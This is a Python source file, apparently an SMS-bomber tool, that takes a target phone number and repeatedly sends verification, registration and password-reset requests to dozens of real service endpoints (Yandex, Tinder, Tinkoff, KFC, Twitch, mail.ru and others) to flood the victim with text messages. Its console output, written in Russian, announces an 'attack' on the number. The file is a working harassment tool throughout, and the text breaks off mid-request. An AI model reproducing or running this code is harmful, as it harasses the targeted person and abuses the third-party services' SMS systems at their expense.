from colorama import *
import requests
import threading
from threading import Timer, Thread
from datetime import datetime, timedelta
import random
import os
import time
from random_useragent import get_agent


class cloop(object):
    def __init__(self):
        pass

    def sms(self, _phone, kolvos):
        ua = get_agent
        if _phone[0] == "+":
            _phone = _phone[1:]
        if _phone[0] == "8":
            _phone = "7" + _phone[1:]
        if _phone[0] == "9":
            _phone = "7" + _phone

        _name = ""
        for x in range(12):
            _name = _name + random.choice(
                list("123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM")
            )
            password = _name + random.choice(
                list("123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM")
            )
            username = _name + random.choice(
                list("123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM")
            )
        iteration = 0
        sms_amount = 0
        _phone9 = _phone[1:]
        _phoneAresBank = (
            "+"
            + _phone[0]
            + "("
            + _phone[1:4]
            + ")"
            + _phone[4:7]
            + "-"
            + _phone[7:9]
            + "-"
            + _phone[9:11]
        )  # +7+(915)350-99-08
        _phone9dostavista = (
            _phone9[:3] + "+" + _phone9[3:6] + "-" + _phone9[6:8] + "-" + _phone9[8:10]
        )  # 915+350-99-08
        _phoneOstin = (
            "+"
            + _phone[0]
            + "+("
            + _phone[1:4]
            + ")"
            + _phone[4:7]
            + "-"
            + _phone[7:9]
            + "-"
            + _phone[9:11]
        )  # '+7+(915)350-99-08'
        _phonePizzahut = (
            "+"
            + _phone[0]
            + " ("
            + _phone[1:4]
            + ") "
            + _phone[4:7]
            + " "
            + _phone[7:9]
            + "-"
            + _phone[9:11]
        )  # '+7 (915) 350 99 08'
        _phoneGorzdrav = (
            _phone[1:4] + ") " + _phone[4:7] + "-" + _phone[7:9] + "-" + _phone[9:11]
        )  # '915) 350-99-08'
        _email = _name + f"{iteration}" + "@gmail.com"
        email = _name + f"{iteration}" + "@gmail.com"
        request_timeout = 0.00001
        kolvos = int(kolvos)
        kk = 0
        r = Fore.RED
        b = Fore.BLUE
        m = Fore.MAGENTA
        g = Fore.GREEN
        y = Fore.YELLOW
        c = Fore.CYAN
        w = Fore.WHITE
        sr = Style.RESET_ALL
        rs = Style.RESET_ALL
        print(
            f"""

[{r}ВНИМАНИЕ{rs}] Атака на номер {_phonePizzahut} начнется через 5 секунд, количество отправленных sms может отличатся от написаного количества.
Для остановки спама, нажмите Ctrl + Z
			"""
        )
        time.sleep(5)
        for kolvo in range(kolvos):
            kolvo = int(kolvo)
            standar_headers = {"User-Agent": ua}
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://p.grabtaxi.com/api/passenger/v2/profiles/register",
                    data={
                        "phoneNumber": _phone,
                        "countryCode": "ID",
                        "name": "test",
                        "email": "mail@mail.com",
                        "deviceToken": "*",
                    },
                    headers={
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api.chef.yandex/api/v2/auth/sms", json={"phone": _phone}
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://lenta.com/api/v1/authentication/requestValidationCode",
                    json={"phone": "+" + _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://dostavista.ru/backend/send-verification-sms",
                    data={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://moscow.rutaxi.ru/ajax_keycode.html", data={"l": _phone9}
                ).json()["res"]
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://belkacar.ru/get-confirmation-code",
                    data={"phone": _phone},
                    headers={},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://secure.online.ua/ajax/check_phone/",
                    params={"reg_phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://cabinet.planetakino.ua/service/sms",
                    params={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://ube.pmsm.org.ru/esb/iqos-phone/validate",
                    json={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api.ivi.ru/mobileapi/user/register/phone/v6",
                    data={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.get(
                    "https://www.finam.ru/api/smslocker/sendcode",
                    data={"phone": "+" + _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api.mtstv.ru/v1/users", json={"msisdn": _phone}, headers={}
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://account.my.games/signup_send_sms/", data={"phone": _phone}
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post("https://kasta.ua/api/v2/login/", data={"phone": _phone})
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/",
                    data={"RECALL": "Y", "BACK_CALL_PHONE": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://city24.ua/personalaccount/account/registration",
                    data={"PhoneNumber": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://client-api.sushi-master.ru/api/v1/auth/init",
                    json={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post("https://auth.multiplex.ua/login", json={"login": _phone})
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": _phone}
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.get(
                    "https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20326-87-32",
                    data={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://koronapay.com/transfers/online/api/users/otps",
                    data={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://btfair.site/api/user/phone/code",
                    json={"phone": "+" + _phone,},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://thehive.pro/auth/signup", json={"phone": "+" + _phone,}
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
                    data={"phone_number": _phone},
                    headers={},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://app.karusel.ru/api/v1/phone/",
                    data={"phone": _phone},
                    headers={},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api.tinkoff.ru/v1/sign_up",
                    data={"phone": "+" + _phone},
                    headers={},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api.mtstv.ru/v1/users", json={"msisdn": _phone}, headers={}
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://youla.ru/web-api/auth/request_code", data={"phone": _phone}
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://pizzahut.ru/account/password-reset",
                    data={
                        "reset_by": "phone",
                        "action_id": "pass-recovery",
                        "phone": _phonePizzahut,
                        "_token": "*",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.rabota.ru/remind", data={"credential": _phone}
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://rutube.ru/api/accounts/sendpass/phone",
                    data={"phone": "+" + _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.citilink.ru/registration/confirm/phone/+"
                    + _phone
                    + "/"
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php",
                    data={"name": _name, "phone": _phone, "promo": "yellowforma"},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.get(
                    "https://www.oyorooms.com/api/pwa/generateotp?phone="
                    + _phone9
                    + "&country_code=%2B7&nod=4&locale=en"
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp",
                    params={
                        "pageName": "loginByUserPhoneVerification",
                        "fromCheckout": "false",
                        "fromRegisterPage": "true",
                        "snLogin": "",
                        "bpg": "",
                        "snProviderId": "",
                    },
                    data={
                        "phone": _phone,
                        "g-recaptcha-response": "",
                        "recaptcha": "on",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://newnext.ru/graphql",
                    json={
                        "operationName": "registration",
                        "variables": {
                            "client": {
                                "firstName": "Иван",
                                "lastName": "Иванов",
                                "phone": _phone,
                                "typeKeys": ["Unemployed"],
                            }
                        },
                        "query": "mutation registration($client: ClientInput!) {"
                        "\n  registration(client: $client) {"
                        "\n	token\n	__typename\n  }\n}\n",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api.sunlight.net/v3/customers/authorization/",
                    data={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/",
                    json={
                        "client_type": "personal",
                        "email": _email,
                        "mobile_phone": _phone,
                        "deliveryOption": "sms",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://lk.invitro.ru/lk2/lka/patient/refreshCode",
                    data={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://online.sbis.ru/reg/service/",
                    json={
                        "jsonrpc": "2.0",
                        "protocol": "5",
                        "method": "Пользователь.ЗаявкаНаФизика",
                        "params": {"phone": _phone},
                        "id": "1",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://ib.psbank.ru/api/authentication/extendedClientAuthRequest",
                    json={
                        "firstName": "Иван",
                        "middleName": "Иванович",
                        "lastName": "Иванов",
                        "sex": "1",
                        "birthDate": "10.10.2000",
                        "mobilePhone": _phone9,
                        "russianFederationResident": "true",
                        "isDSA": "false",
                        "personalDataProcessingAgreement": "true",
                        "bKIRequestAgreement": "null",
                        "promotionAgreement": "true",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru",
                    data={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://app.karusel.ru/api/v1/phone/", data={"phone": _phone}
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",
                    json={"phone": "+" + _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api.carsmile.com/",
                    json={
                        "operationName": "enterPhone",
                        "variables": {"phone": _phone},
                        "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.citilink.ru/registration/confirm/phone/+"
                    + _phone
                    + "/"
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api.delitime.ru/api/v2/signup",
                    data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.get(
                    "https://findclone.ru/register", params={"phone": "+" + _phone}
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.icq.com/smsreg/requestPhoneValidation.php",
                    data={
                        "msisdn": _phone,
                        "locale": "en",
                        "countryCode": "ru",
                        "version": "1",
                        "k": "ic1rtwz1s1Hj1O0r",
                        "r": "46763",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://terra-1.indriverapp.com/api/authorization?locale=ru",
                    data={
                        "mode": "request",
                        "phone": "+" + _phone,
                        "phone_permission": "unknown",
                        "stream_id": 0,
                        "v": 3,
                        "appversion": "3.20.6",
                        "osversion": "unknown",
                        "devicemodel": "unknown",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                    data={
                        "password": password,
                        "application": "lkp",
                        "login": "+" + _phone,
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://ube.pmsm.org.ru/esb/iqos-phone/validate",
                    json={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api.ivi.ru/mobileapi/user/register/phone/v6",
                    data={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://cloud.mail.ru/api/v2/notify/applink",
                    json={
                        "phone": "+" + _phone,
                        "api": 2,
                        "email": "email",
                        "x-email": "x-email",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode",
                    params={"pageName": "registerPrivateUserPhoneVerificatio"},
                    data={
                        "phone": _phone,
                        "recaptcha": "off",
                        "g-recaptcha-response": "",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                    data={"st.r.phone": "+" + _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post("https://plink.tech/register/", json={"phone": _phone})
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",
                    json={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
                    data={"phone_number": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://passport.twitch.tv/register?trusted_request=true",
                    json={
                        "birthday": {"day": 11, "month": 11, "year": 1999},
                        "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp",
                        "include_verification_code": True,
                        "password": password,
                        "phone_number": _phone,
                        "username": username,
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://cabinet.wi-fi.ru/api/auth/by-sms",
                    data={"msisdn": _phone},
                    headers={"App-ID": "cabinet"},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api.wowworks.ru/v2/site/send-code",
                    json={"phone": _phone, "type": 2},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://eda.yandex/api/v1/user/request_authentication_code",
                    json={"phone_number": "+" + _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://youla.ru/web-api/auth/request_code", data={"phone": _phone}
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/",
                    json={
                        "client_type": "personal",
                        "email": f"{email}@gmail.ru",
                        "mobile_phone": _phone,
                        "deliveryOption": "sms",
                    },
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",
                    data={"phone": _phone},
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.delivery-club.ru/ajax/user_otp", data={"phone": _phone}
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/",
                    data={"RECALL": "Y", "BACK_CALL_PHONE": _phone},
                    headers=standar_headers,
                    proxies=proxies,
                )
                kk = kk + 1
                print(
                    f"{g}Отправлено {rs}{kk}{g} sms! На номер {w}{_phonePizzahut}{rs}"
                )
                time.sleep(0.2)
            except:
                print(f"{r}Не отправлено :({rs}")
#------------------------------------------------------------------------------#
            try:
                requests.post(
                    "https://www.flipkart.com/api/5/user/otp/generate",
                    headers={
                        "Origin": "https://www.flipkart.com",
                        "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
                    },
                    data={"loginId": "+" + _phone},
                )
                kk = kk + 1
